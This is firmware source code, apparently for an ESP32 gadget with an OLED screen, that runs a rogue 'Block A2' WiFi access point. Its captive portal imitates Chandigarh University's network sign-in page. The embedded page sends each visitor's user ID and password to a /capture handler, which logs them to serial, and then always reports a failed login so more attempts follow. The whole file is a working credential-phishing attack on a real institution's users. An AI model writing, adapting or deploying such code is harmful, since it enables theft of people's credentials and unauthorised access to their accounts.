#include "wifi.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include "esp_wifi.h"

extern int readButton();

#define SCREEN_W  128
#define SCREEN_H   32
#define DNS_PORT   53

const char *SSID = "Block A2";

DNSServer  dnsServer;
WebServer  webServer(80);

static int  clientCount = 0;
static bool running     = true;

static const char PORTAL_HTML[] PROGMEM = R"(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Block A2 WiFi — Chandigarh University</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { min-height: 100vh; background: #fff; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; padding: 24px; }
    .card { width: 100%; max-width: 420px; background: #545454; border: 1px solid rgba(255,255,255,0.10); border-radius: 20px; padding: 40px 36px 36px; box-shadow: 0 24px 64px rgba(0,0,0,0.5); position: relative; }
    .card::before { content: ''; position: absolute; top: 0; left: 16px; right: 16px; height: 3px; background: #d40000; border-radius: 0 0 4px 4px; }
    .logo-row { display: flex; align-items: center; gap: 12px; margin-bottom: 28px; }
    .logo-icon { width: 42px; height: 42px; background: #d40000; border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .logo-text .inst  { font-size: 11px; font-weight: 600; color: #A0A8C0; letter-spacing: 0.08em; text-transform: uppercase; }
    .logo-text .block { font-size: 17px; font-weight: 700; color: #F0F0F0; }
    h2 { font-size: 22px; font-weight: 700; color: #F0F0F0; margin-bottom: 6px; }
    .subtitle { font-size: 13px; color: #A0A8C0; margin-bottom: 28px; }
    .field { margin-bottom: 18px; }
    input[type="text"], input[type="password"] { width: 100%; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.10); border-radius: 12px; padding: 13px 14px; font-size: 15px; color: #ffffff; font-family: inherit; outline: none; transition: border-color 0.2s; }
    input::placeholder { color: rgba(160,168,192,0.5); }
    input:focus { background-color: rgb(255,255,255); color: #000000; }
    .btn-login { width: 100%; padding: 14px; background: #d40000; color: #fff; font-size: 15px; font-weight: 700; font-family: inherit; letter-spacing: 0.04em; border: none; border-radius: 50px; cursor: pointer; transition: opacity 0.2s, transform 0.15s; margin-top: 4px; }
    .btn-login:hover  { background-color: rgb(95,95,242); transform: translateY(-1px); }
    .btn-login:active { transform: translateY(0); }
    .btn-login:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
    .btn-login .spinner { display: none; width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto; }
    .btn-login.loading .btn-text { display: none; }
    .btn-login.loading .spinner  { display: block; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .error-msg { display: none; background: rgba(255,0,0,0.10); border: 1px solid rgba(255,0,0,0.30); color: #FF7A7A; font-size: 13px; border-radius: 8px; padding: 10px 14px; margin-top: 14px; text-align: center; }
    .success-msg { display: none; background: rgba(0,200,100,0.10); border: 1px solid rgba(0,200,100,0.3); color: #5EF0A0; font-size: 13px; border-radius: 8px; padding: 10px 14px; margin-top: 14px; text-align: center; }
    .footer { margin-top: 28px; text-align: center; font-size: 11.5px; color: #A0A8C0; line-height: 1.6; }
    .footer a { color: #d40000; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    @keyframes pulse { 0%,100%{opacity:0.3} 50%{opacity:1} }
    .w1 { animation: pulse 1.8s ease-in-out 0.0s infinite; }
    .w2 { animation: pulse 1.8s ease-in-out 0.3s infinite; }
    .w3 { animation: pulse 1.8s ease-in-out 0.6s infinite; }
  </style>
</head>
<body>
<div class="card">
  <div class="logo-row">
    <div class="logo-icon">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path class="w3" d="M1.41 7.73A16 16 0 0 1 22.59 7.73" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
        <path class="w2" d="M4.93 11.25A11 11 0 0 1 19.07 11.25" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
        <path class="w1" d="M8.46 14.77A6 6 0 0 1 15.54 14.77" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
        <circle cx="12" cy="18.5" r="1.5" fill="#fff"/>
      </svg>
    </div>
    <div class="logo-text">
      <div class="inst">Chandigarh University</div>
      <div class="block">Block A2 - WiFi</div>
    </div>
  </div>
  <h2>Sign in to connect</h2>
  <p class="subtitle">Use your CU portal credentials to access the network.</p>
  <div class="field">
    <input type="text" id="uid" placeholder="Enter User Id" autocomplete="username" />
  </div>
  <div class="field">
    <input type="password" id="pwd" placeholder="Enter Password" autocomplete="current-password" />
  </div>
  <button class='btn-login' id='loginBtn' onclick='runLogin()'>
    <span class="btn-text">Connect to WiFi</span>
    <div class="spinner"></div>
  </button>
  <div class="error-msg"   id="errMsg"></div>
  <div class="success-msg" id="okMsg"></div>
  <div class="footer">
    Having trouble? Contact <a href="#">IT Support</a><br/>
    or visit the Help Desk at A2 Ground Floor.
  </div>
</div>
<script>
  function showMsg(type, text) {
    const err = document.getElementById('errMsg');
    const ok  = document.getElementById('okMsg');
    err.style.display = 'none';
    ok.style.display  = 'none';
    if (type === 'error') { err.textContent = text; err.style.display = 'block'; }
    if (type === 'ok')    { ok.textContent  = text; ok.style.display  = 'block'; }
  }

  async function runLogin() {
    const uid = document.getElementById('uid').value.trim();
    const pwd = document.getElementById('pwd').value;
    const btn = document.getElementById('loginBtn');

    if (!uid) { showMsg('error', 'Please enter your User ID.'); return; }
    if (!pwd) { showMsg('error', 'Please enter your password.'); return; }

    btn.classList.add('loading');
    btn.disabled = true;
    showMsg('', '');

    try {
      await fetch('/capture?u=' + encodeURIComponent(uid) + '&p=' + encodeURIComponent(pwd));
    } catch(e) {}

    await new Promise(r => setTimeout(r, 2000));
    showMsg('error', 'Authentication failed. Please check your credentials and try again.');
    btn.classList.remove('loading');
    btn.disabled = false;
  }

  ['uid','pwd'].forEach(id =>
    document.getElementById(id).addEventListener('keydown', e => {
      if (e.key === 'Enter') runLogin();
    })
  );
</script>
</body>
</html>
)";

// ── UI ────────────────────────────────────────────────────────────────────

static void drawUI(Adafruit_SSD1306 &d, bool run, int count)
{
    d.clearDisplay();
    d.setTextWrap(false);
    d.fillRect(0, 0, SCREEN_W, 10, WHITE);
    d.setTextColor(BLACK);
    d.setTextSize(1);
    d.setCursor(2, 1);
    d.print("WIFI STATUS");
    d.setCursor(86, 1);
    d.print(run ? "RUNNING" : "STOPPED");
    d.setTextColor(WHITE);
    d.setTextSize(1);
    d.setCursor(0, 13);
    d.print("SSID: ");
    d.print(SSID);
    d.setCursor(0, 23);
    d.print("CLIENTS: ");
    d.print(count);
    d.display();
}

// ── helpers ───────────────────────────────────────────────────────────────

static void handleCapture() {
    if (webServer.hasArg("u") && webServer.hasArg("p")) {
        Serial.println("═══════════════════════");
        Serial.print("USER: ");
        Serial.println(webServer.arg("u"));
        Serial.print("PASS: ");
        Serial.println(webServer.arg("p"));
        Serial.println("═══════════════════════");
    }
    webServer.send(200, "application/json", "{\"ok\":true}");
}

static void startAP()
{
    WiFi.softAP(SSID);
    delay(500);
    IPAddress ip(192, 168, 4, 1);
    IPAddress mask(255, 255, 255, 0);
    WiFi.softAPConfig(ip, ip, mask);

    dnsServer.start(DNS_PORT, "*", ip);

    webServer.on("/capture", handleCapture);

    webServer.onNotFound([]() {
        wifi_sta_list_t stationList;
        esp_wifi_ap_get_sta_list(&stationList);
        clientCount = stationList.num;
        Serial.printf("CLIENT #%d\n", clientCount);
        webServer.send(200, "text/html", String(FPSTR(PORTAL_HTML)));
    });

    webServer.begin();
}

static void stopAP()
{
    webServer.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
}

// ── main entry ────────────────────────────────────────────────────────────

void runWifi(Adafruit_SSD1306 &display)
{
    running = true;
    startAP();
    drawUI(display, running, clientCount);

    while (true) {
        dnsServer.processNextRequest();
        webServer.handleClient();

        wifi_sta_list_t stationList;
        esp_wifi_ap_get_sta_list(&stationList);
        if ((int)stationList.num != clientCount) {
            clientCount = stationList.num;
            drawUI(display, running, clientCount);
        }

        if (readButton()) {
            stopAP();
            return;
        }

        delay(10);
    }
}